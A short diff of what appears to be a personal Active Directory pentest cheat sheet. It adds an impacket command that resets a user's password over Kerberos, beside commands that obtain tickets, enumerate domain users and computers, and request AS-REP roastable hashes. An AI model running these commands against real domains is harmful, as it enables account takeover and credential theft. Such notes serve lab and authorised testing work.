@@ -193,7 +193,8 @@ unzip backup.zip -d .
 
 ## Valid Creds
 sudo skewme $TARGET
-impacket-getTGT $DOM/'$USERNAME':'$PASSWORD'; kcme
+impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
+impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee usernames
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee computers
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
